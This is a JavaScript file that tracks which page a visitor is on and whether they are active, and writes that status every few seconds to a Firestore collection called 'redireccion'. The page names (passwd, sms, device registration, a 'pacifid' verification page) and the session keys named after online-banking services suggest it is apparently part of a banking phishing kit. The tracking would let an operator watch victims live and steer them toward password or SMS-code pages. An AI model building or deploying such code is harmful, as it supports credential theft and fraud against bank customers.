
(function () {
  'use strict';

  var CONFIG = {
    INACTIVITY_TIMEOUT: 30000,
    UPDATE_INTERVAL: 5000,
    VISIBILITY_UPDATE_DELAY: 2000
  };

  var PAGE_PATTERNS = [
    { match: 'index.html', location: 'index' },
    { match: 'passwd.html', location: 'passwd' },
    { match: 'sms.html', location: 'sms' },
    { match: 'registra-tu-dispositivo.html', location: 'registro-dispositivo' },
    { match: 'pacifidid.html', location: 'pacifid' },
    { match: 'pacifidID.html', location: 'pacifid' },
    { match: 'dashboard.html', location: 'dashboard' },
    { match: 'verificacion-exitosa.html', location: 'verificacion-exitosa' }
  ];

  var SESSION_KEY_CANDIDATES = [
    'bseSessionUser',
    'intermaticoActual',
    'current_dashboard_user',
    'dashboard_session_user',
    'personaActual',
    'empresaActual',
    'usuarioActual'
  ];

  var userId = null;
  var pageLocation = null;
  var isActive = true;
  var inactivityTimer = null;
  var updateTimer = null;
  var lastFirestoreUpdate = 0;

  function determinePageLocation() {
    var path = (window.location.pathname || '').toLowerCase();
    var i;
    for (i = 0; i < PAGE_PATTERNS.length; i++) {
      if (path.indexOf(PAGE_PATTERNS[i].match) !== -1) {
        return PAGE_PATTERNS[i].location;
      }
    }
    return 'unknown';
  }

  function getFromStorage(storage, keys) {
    if (!storage || !keys) {
      return null;
    }
    var i;
    for (i = 0; i < keys.length; i++) {
      try {
        var value = storage.getItem(keys[i]);
        if (value && value.trim().length > 0) {
          return value.trim();
        }
      } catch (error) {
        return null;
      }
    }
    return null;
  }

  function getUserId() {
    var sessionId = getFromStorage(sessionStorage, SESSION_KEY_CANDIDATES);
    if (sessionId) {
      return sessionId;
    }
    var params = new URLSearchParams(window.location.search);
    return params.get('user') || params.get('usuario') || params.get('id');
  }

  function updateActivityInFirestore(forceUpdate) {
    if (!userId || !window.firebase || !firebase.firestore) {
      return;
    }
    var now = Date.now();
    if (!forceUpdate && now - lastFirestoreUpdate < CONFIG.UPDATE_INTERVAL) {
      return;
    }
    firebase.firestore().collection('redireccion').doc(userId).update({
      isActive: isActive,
      lastActivity: firebase.firestore.FieldValue.serverTimestamp(),
      pageLocation: pageLocation,
      activityUpdated: new Date().toISOString()
    }).then(function () {
      lastFirestoreUpdate = now;
    }).catch(function () {});
  }

  function markAsActive() {
    var wasInactive = !isActive;
    isActive = true;
    if (wasInactive) {
      updateActivityInFirestore(true);
    }
    clearTimeout(inactivityTimer);
    inactivityTimer = setTimeout(function () {
      isActive = false;
      updateActivityInFirestore(true);
    }, CONFIG.INACTIVITY_TIMEOUT);
  }

  function handleVisibilityChange() {
    if (document.hidden) {
      isActive = false;
      clearTimeout(inactivityTimer);
      setTimeout(function () {
        updateActivityInFirestore(true);
      }, CONFIG.VISIBILITY_UPDATE_DELAY);
    } else {
      markAsActive();
      updateActivityInFirestore(true);
    }
  }

  function initializeTracking() {
    userId = getUserId();
    if (!userId) {
      return;
    }
    pageLocation = determinePageLocation();
    isActive = true;
    updateActivityInFirestore(true);

    ['mousemove', 'keydown', 'scroll', 'click', 'touchstart'].forEach(function (eventName) {
      document.addEventListener(eventName, markAsActive, { passive: true });
    });
    document.addEventListener('visibilitychange', handleVisibilityChange);

    updateTimer = setInterval(function () {
      if (isActive && !document.hidden) {
        updateActivityInFirestore();
      }
    }, CONFIG.UPDATE_INTERVAL);

    inactivityTimer = setTimeout(function () {
      isActive = false;
      updateActivityInFirestore(true);
    }, CONFIG.INACTIVITY_TIMEOUT);
  }

  function boot() {
    if (window.db && window.firebase) {
      initializeTracking();
      return;
    }
    window.addEventListener('firebaseReady', initializeTracking, { once: true });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

  window.addEventListener('pagehide', function () {
    clearTimeout(inactivityTimer);
    clearInterval(updateTimer);
  });
})();
